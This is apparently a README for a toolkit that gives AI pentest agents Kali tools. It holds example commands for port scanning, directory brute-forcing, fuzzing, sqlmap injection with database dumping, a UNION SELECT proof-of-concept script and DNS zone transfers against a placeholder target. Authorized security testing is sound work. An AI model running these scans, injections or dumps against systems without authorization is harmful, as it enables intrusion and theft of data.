# Kali Tools

Command-line pentesting tools for pentest-executor agents. Provides network scanning, web scanning, injection testing, and reconnaissance capabilities.

## Purpose

Provides command-line security testing tools for pentest-executor agents to:
- Perform network reconnaissance and port scanning
- Enumerate services and identify vulnerabilities
- Test for SQL injection and other injection flaws
- Scan web applications for common vulnerabilities
- Discover hidden directories and files
- Test SSL/TLS configurations
- Perform DNS enumeration

## Installation

```bash
./tools/kali/install.sh
```

This will install:

**Network Scanning:**
- nmap - Network scanner and service enumerator
- masscan - High-speed port scanner

**Web Scanning:**
- nikto - Web server vulnerability scanner
- dirb - Directory/file brute-forcer
- gobuster - Directory/DNS brute-forcing tool
- ffuf - Fast web fuzzer

**Injection Testing:**
- sqlmap - Automated SQL injection exploitation

**SSL/TLS Testing:**
- testssl - SSL/TLS vulnerability scanner

**HTTP Tools:**
- curl - HTTP client
- wget - File downloader
- jq - JSON processor

**DNS Tools:**
- dig - DNS lookup utility
- host - DNS lookup utility

**Python Packages:**
- requests, beautifulsoup4, dnspython, python-nmap, shodan, censys

## Usage

### Verify Installation

```bash
./tools/kali/run.sh
```

### Integration with Pentest-Executor

Pentest-executor agents use Kali tools via Bash:

```yaml
tools: [mcp__plugin_playwright_playwright__*, Bash, Read, Write]
```

### Network Scanning

**Port Scanning (nmap):**
```bash
# Basic scan
nmap target.com

# Service version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Comprehensive scan
nmap -sV -sC -O -p- target.com -oN scan_results.txt

# Vulnerability scanning
nmap --script vuln target.com
```

**Fast Port Scanning (masscan):**
```bash
# Scan all ports at high speed
masscan -p1-65535 target.com --rate=10000

# Scan specific ports
masscan -p80,443,8080 target.com
```

### Web Scanning

**Nikto:**
```bash
# Basic web scan
nikto -h https://target.com

# SSL-only scan
nikto -h https://target.com -ssl

# Save output
nikto -h https://target.com -output nikto_results.txt
```

**Directory Brute-forcing (gobuster):**
```bash
# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u https://target.com -w wordlist.txt -x php,html,txt

# DNS subdomain enumeration
gobuster dns -d target.com -w subdomains.txt
```

**Fast Fuzzing (ffuf):**
```bash
# Directory fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Parameter fuzzing
ffuf -u https://target.com/page?FUZZ=test -w params.txt

# POST data fuzzing
ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=test" -w users.txt
```

### SQL Injection Testing

**SQLMap:**
```bash
# Test URL parameter
sqlmap -u "https://target.com/page?id=1" --batch

# Test POST data
sqlmap -u "https://target.com/login" --data "user=test&pass=test" --batch

# Dump database
sqlmap -u "https://target.com/page?id=1" --dump --batch

# Test with custom headers
sqlmap -u "https://target.com/api/data" --headers="Authorization: Bearer TOKEN" --batch

# Test forms
sqlmap -u "https://target.com/login" --forms --batch

# Risk and level
sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3 --batch
```

### SSL/TLS Testing

**TestSSL:**
```bash
# Basic SSL test
testssl https://target.com

# Check specific vulnerabilities
testssl --heartbleed --poodle https://target.com

# Full test with JSON output
testssl --jsonfile results.json https://target.com
```

### DNS Enumeration

**Dig:**
```bash
# Basic DNS lookup
dig target.com

# Specific record type
dig target.com A
dig target.com MX
dig target.com TXT

# Reverse lookup
dig -x 1.2.3.4

# Zone transfer attempt
dig @ns1.target.com target.com AXFR
```

**Host:**
```bash
# Basic lookup
host target.com

# Specific record type
host -t MX target.com
host -t TXT target.com
```

### HTTP Request Manipulation

**Curl:**
```bash
# Basic GET request
curl https://target.com

# POST request
curl -X POST https://target.com/api -d "key=value"

# Custom headers
curl -H "Authorization: Bearer TOKEN" https://target.com/api

# Follow redirects
curl -L https://target.com

# Save cookies
curl -c cookies.txt https://target.com/login

# Use cookies
curl -b cookies.txt https://target.com/profile

# Proxy request
curl -x http://127.0.0.1:8080 https://target.com
```

## Pentest-Executor Integration Examples

### SQL Injection Executor

```bash
# Phase 1: Recon
nmap -p80,443 -sV target.com

# Phase 2: Experiment
curl "https://target.com/page?id=1'" | tee response.txt

# Phase 3: Test
sqlmap -u "https://target.com/page?id=1" --batch --level=3

# Phase 4: Verify - Create PoC
cat > poc.py <<EOF
import requests
url = "https://target.com/page?id=1' UNION SELECT NULL,NULL,NULL--"
r = requests.get(url)
print(r.text)
EOF

python poc.py > poc_output.txt
```

### Network Reconnaissance Executor

```bash
# Phase 1: Recon
nmap -sV -sC -p- target.com -oN nmap_results.txt

# Phase 2: Experiment
for port in $(grep open nmap_results.txt | cut -d/ -f1); do
    curl -v http://target.com:$port 2>&1 | tee "port_${port}_response.txt"
done

# Phase 3: Test
nmap --script vuln target.com -oN vuln_scan.txt

# Phase 4: Verify
# Document findings and create evidence
```

### Web Application Executor

```bash
# Phase 1: Recon
nikto -h https://target.com -output nikto_scan.txt

# Phase 2: Experiment
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt

# Phase 3: Test
# Test discovered endpoints
for endpoint in $(cat gobuster_results.txt | grep "Status: 200" | cut -d' ' -f1); do
    curl -v "https://target.com$endpoint" 2>&1 | tee "endpoint_${endpoint//\//_}_response.txt"
done

# Phase 4: Verify
# Create PoCs for vulnerable endpoints
```

## Tool Categories

### Network Scanning
- **nmap**: Comprehensive network scanner and service enumerator
- **masscan**: High-speed port scanner for large networks

### Web Scanning
- **nikto**: Web server vulnerability scanner (6000+ checks)
- **dirb**: Directory/file brute-forcer
- **gobuster**: Multi-purpose brute-forcing tool
- **ffuf**: Fast web fuzzer with flexible options

### Injection Testing
- **sqlmap**: Automated SQL injection detection and exploitation

### SSL/TLS Testing
- **testssl**: Comprehensive SSL/TLS vulnerability scanner

### HTTP Tools
- **curl**: Command-line HTTP client with extensive options
- **wget**: Non-interactive file downloader
- **jq**: JSON processor for parsing API responses

### DNS Tools
- **dig**: DNS lookup utility with detailed output
- **host**: Simplified DNS lookup tool

## Capabilities

- Port scanning and service enumeration
- Web vulnerability scanning
- Directory/file discovery
- SQL injection testing
- SSL/TLS vulnerability testing
- DNS enumeration and zone transfers
- HTTP request manipulation
- Proxy support
- Cookie handling
- Custom header injection

## Attack Types Supported

- **Network Reconnaissance**: Port scanning, service enumeration
- **Web Application Scanning**: Vulnerability detection, directory discovery
- **SQL Injection**: Detection, exploitation, database dumping
- **Information Disclosure**: File discovery, configuration exposure
- **SSL/TLS Vulnerabilities**: Heartbleed, POODLE, weak ciphers
- **DNS Enumeration**: Subdomain discovery, zone transfers

## Configuration

Located in `tools/kali/config.json`:

```json
{
  "name": "kali",
  "categories": {
    "network_scanning": ["nmap", "masscan"],
    "web_scanning": ["nikto", "dirb", "gobuster", "ffuf"],
    "injection_testing": ["sqlmap"],
    ...
  },
  "capabilities": [...],
  "use_cases": [...]
}
```

Tool paths are registered in `tools/kali/tools.txt`.

## Wordlists

Common wordlist locations:
- **Kali Linux**: `/usr/share/wordlists/`
- **SecLists**: https://github.com/danielmiessler/SecLists
- **Common directories**: `/usr/share/wordlists/dirb/common.txt`
- **DNS subdomains**: `/usr/share/wordlists/dnsmap.txt`

## Troubleshooting

### Tool not found
```bash
# Check if installed
which nmap

# Reinstall
./tools/kali/install.sh
```

### Permission errors
```bash
# Some tools require root
sudo nmap -O target.com

# Or use sudo for entire script
sudo ./tools/kali/install.sh
```

### Masscan not working
```bash
# Masscan requires root on most systems
sudo masscan -p80,443 target.com
```

### SQLMap errors
```bash
# Clear SQLMap cache
rm -rf ~/.local/share/sqlmap/

# Update SQLMap
sqlmap --update
```

## Security Considerations

- Always obtain authorization before testing
- These tools can be detected by IDS/IPS systems
- Use responsibly and legally
- Some tools require root privileges
- Rate limiting may be needed to avoid detection
- Always respect scope boundaries

## References

- [Nmap Documentation](https://nmap.org/book/man.html)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- Pentest-executor agent: `.claude/agents/pentester-executor.md`
- SQL Injection guide: `.claude/skills/pentest/attacks/injection/sql-injection/`
- Network attacks guide: `.claude/skills/pentest/attacks/network/`
